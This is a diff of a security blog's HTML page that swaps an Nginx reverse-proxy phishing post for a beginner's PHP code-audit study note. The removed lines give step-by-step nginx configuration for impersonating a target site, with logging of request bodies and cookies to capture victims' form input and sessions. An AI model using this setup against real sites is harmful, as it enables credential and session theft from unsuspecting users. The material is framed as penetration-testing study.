@@ -16,28 +16,22 @@
   <meta name="author" content="X1ly?S">
   <meta name="keywords" content="网络安全 渗透测试">
   
-    <meta name="description" content="前言：Nginx反向代理的流程，根据Nginx反向代理配置，把访问者的请求转发给设置好的目标服务器，目标服务器接收请求后把资源转发给Nginx反向代理服务器，再由Nginx反向代理服务器转发给访问者  简介  环境准备 Linux Ubuntu VPS 安装Nginx  1sudo apt-get install nginx -y   启动Nginx  1service nginx start">
+    <meta name="description" content="前言：俺开始学代码审计了，之前一直在黑盒方面学习，黑盒漏洞挖掘，没有接触过白盒，于是开始学习代码审计。【代码审计-Day X】系列是我的0基础学习记录笔记，写的不好，但是也是一个记录吧，多年之后再看也是会感慨万千吧哈哈，最后学习完了代码审计我会写一个总结性的文章，还望各位大佬师傅轻喷，欢迎随时指教小弟……  代码审计通用思路 关键词法：使用正则匹配找关键词：特定函数，特定参数等等 功能点法：围绕">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Nginx反向代理钓鱼">
-<meta property="og:url" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/index.html">
+<meta property="og:title" content="PHP-代码审计-Day-1">
+<meta property="og:url" content="https://example.com/2024/06/18/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Day-1/index.html">
 <meta property="og:site_name" content="X1ly?S Blog">
-<meta property="og:description" content="前言：Nginx反向代理的流程，根据Nginx反向代理配置，把访问者的请求转发给设置好的目标服务器，目标服务器接收请求后把资源转发给Nginx反向代理服务器，再由Nginx反向代理服务器转发给访问者  简介  环境准备 Linux Ubuntu VPS 安装Nginx  1sudo apt-get install nginx -y   启动Nginx  1service nginx start">
+<meta property="og:description" content="前言：俺开始学代码审计了，之前一直在黑盒方面学习，黑盒漏洞挖掘，没有接触过白盒，于是开始学习代码审计。【代码审计-Day X】系列是我的0基础学习记录笔记，写的不好，但是也是一个记录吧，多年之后再看也是会感慨万千吧哈哈，最后学习完了代码审计我会写一个总结性的文章，还望各位大佬师傅轻喷，欢迎随时指教小弟……  代码审计通用思路 关键词法：使用正则匹配找关键词：特定函数，特定参数等等 功能点法：围绕">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/1.png">
-<meta property="og:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/2.png">
-<meta property="og:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/3.png">
-<meta property="og:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/4.png">
-<meta property="og:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/5.png">
-<meta property="article:published_time" content="2024-06-13T02:35:31.000Z">
-<meta property="article:modified_time" content="2024-06-13T02:40:37.003Z">
+<meta property="article:published_time" content="2024-06-17T16:56:10.000Z">
+<meta property="article:modified_time" content="2024-06-19T04:14:11.953Z">
 <meta property="article:author" content="X1ly?S">
-<meta property="article:tag" content="Nginx反向代理钓鱼">
+<meta property="article:tag" content="PHP代码审计">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://example.com/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/1.png">
   
   
   
-  <title>Nginx反向代理钓鱼 - X1ly?S Blog</title>
+  <title>PHP-代码审计-Day-1 - X1ly?S Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -244,7 +238,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Nginx反向代理钓鱼"></span>
+            <span id="subtitle" data-typed-text="PHP-代码审计-Day-1"></span>
           
         </div>
 
@@ -260,8 +254,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-06-13 10:35" pubdate>
-          2024年6月13日 上午
+        <time datetime="2024-06-18 00:56" pubdate>
+          2024年6月18日 凌晨
         </time>
       </span>
     
@@ -272,7 +266,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          373 字
+          761 字
         
       </span>
     
@@ -283,7 +277,7 @@
         
         
         
-          4 分钟
+          7 分钟
         
       </span>
     
@@ -328,12 +322,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Nginx反向代理钓鱼</h1>
+            <h1 id="seo-header">PHP-代码审计-Day-1</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年6月13日 上午
+                    本文最后更新于 2024年6月19日 中午
                   
                 
               </p>
@@ -342,69 +336,53 @@
               <div class="markdown-body">
                 
                 <blockquote>
-<p>前言：Nginx反向代理的流程，根据Nginx反向代理配置，把访问者的请求转发给设置好的目标服务器，目标服务器接收请求后把资源转发给Nginx反向代理服务器，再由Nginx反向代理服务器转发给访问者</p>
+<p>前言：俺开始学代码审计了，之前一直在黑盒方面学习，黑盒漏洞挖掘，没有接触过白盒，于是开始学习代码审计。【代码审计-Day X】系列是我的0基础学习记录笔记，写的不好，但是也是一个记录吧，多年之后再看也是会感慨万千吧哈哈，最后学习完了代码审计我会写一个总结性的文章，还望各位大佬师傅轻喷，欢迎随时指教小弟……</p>
 </blockquote>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><img src="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/1.png" srcset="/img/loading.gif" lazyload class="">
-
-<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
-<li>Linux Ubuntu VPS</li>
-<li>安装Nginx</li>
+<h2 id="代码审计通用思路"><a href="#代码审计通用思路" class="headerlink" title="代码审计通用思路"></a>代码审计通用思路</h2><ul>
+<li>关键词法：使用正则匹配找关键词：特定函数，特定参数等等</li>
+<li>功能点法：围绕功能点去审计与功能点相关的漏洞</li>
+<li>工具自动审计法</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install nginx -y<br></code></pre></td></tr></table></figure>
+<h2 id="SQL语句监控审计法"><a href="#SQL语句监控审计法" class="headerlink" title="SQL语句监控审计法"></a>SQL语句监控审计法</h2><ul>
+<li>使用SQL语句监控工具，网站实时监控执行了哪些SQL语句，从SQL中筛选出可能存在可控变量的语句，再定位到代码进一步分析是否存在漏洞</li>
+<li>注意：该方法适用于，SQL语句在同一时间内执行的不算很多的情况，如果同一时间内执行的太多，那么一句一句去筛选出可控变量也不够高效</li>
+</ul>
+
 
 <ul>
-<li>启动Nginx</li>
+<li>工具推荐：<a target="_blank" rel="noopener" href="https://github.com/fupinglee/MySQLMonitor">https://github.com/fupinglee/MySQLMonitor</a></li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service nginx start<br></code></pre></td></tr></table></figure>
+<h2 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>MVC（Model–view–controller）是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B">软件工程</a>中的一种<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84">软件架构</a>模式，把软件系统分为三个基本部分：模型（Model）、视图（View）和控制器（Controller）</p>
+<h3 id="为什么要用-MVC"><a href="#为什么要用-MVC" class="headerlink" title="为什么要用 MVC"></a>为什么要用 MVC</h3><p>随着系统业务复杂度越来越高，功能模块越来越庞大，耦合度也越来越高，导致系统的复杂度越来越不可控。为了更好的降低应用及模块间的耦合度，于是，诞生了一些我们熟知的网络架构（分布式微服务）和应用架构（三层架构、MVC架构，在此架构上又出现了一些框架，如SSM框架、SSH框架等，使用框架的好处就是结构清晰易于维护）</p>
+<p>其中就有MVC架构，其要点是：</p>
+<p><strong>关注点分离（separation of concerns，缩写为 SoC）</strong>。</p>
+<p>MVC 模式有助于将前端和后端代码拆分为独立的组件，这样更便于管理，而且能够更方便地改动其中的某一部分而不会互相影响。</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul>
+<li><strong>模型（Model）</strong>：负责数据和业务逻辑，通常包含数据存储、检索和业务规则。</li>
+<li><strong>视图（View）</strong>：负责显示数据（模型）的用户界面，不包含业务逻辑。</li>
+<li><strong>控制器（Controller）</strong>：接收用户的输入，调用模型和视图去完成用户的请求。</li>
+</ul>
+<h3 id="简单流程"><a href="#简单流程" class="headerlink" title="简单流程"></a>简单流程</h3>
 
-<h2 id="配置反向代理"><a href="#配置反向代理" class="headerlink" title="配置反向代理"></a>配置反向代理</h2><ul>
-<li>新建反向代理配置文件</li>
+<h2 id="版本对比技术"><a href="#版本对比技术" class="headerlink" title="版本对比技术"></a>版本对比技术</h2><ul>
+<li>对于两个不同的版本，发生差异之处，有可能就是对安全漏洞修复之处，通过版本比对工具可以快速定位，从而进行代码审计分析</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/nginx/sites-enabled/reverse-proxy.conf<br></code></pre></td></tr></table></figure>
+
 
 <ul>
-<li>配置</li>
+<li>工具：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ataoxz/p/18070447">https://www.cnblogs.com/ataoxz/p/18070447</a></li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">server<br>&#123;<br>    listen 80; <span class="hljs-comment"># 监听端口</span><br>    server_name 1.2.3.4; <span class="hljs-comment"># 本机真实IP</span><br>    location / &#123;<br>        proxy_pass http://xxx.xxx.xxx.xxx; <span class="hljs-comment"># 反代的网站，即想要伪造的网站</span><br>        proxy_set_header Host <span class="hljs-variable">$host</span>;<br>        proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>        proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>    &#125;<br>    access_log /var/log/nginx/access_log_8081.<span class="hljs-built_in">log</span> testLog; <span class="hljs-comment"># 日志保存位置，testLog为自定义的日志格式</span><br>&#125;<br></code></pre></td></tr></table></figure>
-
-<ul>
-<li>编辑Nginx配置文件</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/nginx/nginx.conf<br></code></pre></td></tr></table></figure>
-
-<ul>
-<li>找到这两行</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">include /etc/nginx/mime.types;<br>default_type application/octet-stream;<br></code></pre></td></tr></table></figure>
-
-<p>在这两行下面添加2句</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">log_format testLog escape=json <span class="hljs-string">&#x27;$request_filename $http_x_forwarded_for $fastcgi_script_name $document_root $request_body&#x27;</span> <span class="hljs-variable">$http_cookie</span>;<br>include /etc/nginx/sites-enabled/reverse-proxy.conf;<br></code></pre></td></tr></table></figure>
-
-<ul>
-<li>重启Nginx</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service nginx restart<br></code></pre></td></tr></table></figure>
-
-<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><ul>
-<li>目标网站</li>
-</ul>
-<img src="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/2.png" srcset="/img/loading.gif" lazyload class="">
-
-<ul>
-<li>这是攻击者的Nginx反向代理服务器看到的页面</li>
-</ul>
-<img src="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/3.png" srcset="/img/loading.gif" lazyload class="">
-
-<ul>
-<li>如果受害者在攻击者的这个Nginx反向代理服务器的页面输入表单，所有输入，cookie session都会被攻击者截获，可在日志查看！</li>
-</ul>
-<img src="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/4.png" srcset="/img/loading.gif" lazyload class="">
-
-<img src="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/5.png" srcset="/img/loading.gif" lazyload class="">
-
-<blockquote>
-<p>参考：<br><a target="_blank" rel="noopener" href="https://bblog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/09.%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC/03.nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC.html">https://bblog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/09.%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC/03.nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC.html</a></p>
+<h2 id="XDebug-动态调试技术"><a href="#XDebug-动态调试技术" class="headerlink" title="XDebug 动态调试技术"></a>XDebug 动态调试技术</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><blockquote>
+<p>搭建教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/100114242">https://blog.csdn.net/nzjdsds/article/details/100114242</a></p>
 </blockquote>
+<ul>
+<li>phpstudy-2018</li>
+<li>phpstorm-2018.1.7</li>
+<li>php-5.4.45</li>
+<li>Apache</li>
+</ul>
+
+
 
                 
               </div>
@@ -423,7 +401,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/" class="category-chain-item">社会工程学</a>
+  <a href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">PHP代码审计</a>
   
   
 
@@ -438,7 +416,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/" class="print-no-link">#Nginx反向代理钓鱼</a>
+        <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#PHP代码审计</a>
       
     </div>
   
@@ -452,9 +430,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/06/18/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Day-1/" title="PHP-代码审计-Day-1">
+                      <a href="/2024/06/19/PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE-%E6%B7%A1%E7%84%B6%E7%82%B9%E5%9B%BE%E6%A0%87%E7%B3%BB%E7%BB%9F-SQL-XFF%E6%B3%A8%E5%85%A5/" title="PHP-代码审计项目-淡然点图标系统-SQL_XFF注入">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">PHP-代码审计-Day-1</span>
+                        <span class="hidden-mobile">PHP-代码审计项目-淡然点图标系统-SQL_XFF注入</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -462,8 +440,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/06/12/RDP-CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="RDP_CVE-2019-0708漏洞复现">
-                        <span class="hidden-mobile">RDP_CVE-2019-0708漏洞复现</span>
+                      <a href="/2024/06/13/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/" title="Nginx反向代理钓鱼">
+                        <span class="hidden-mobile">Nginx反向代理钓鱼</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
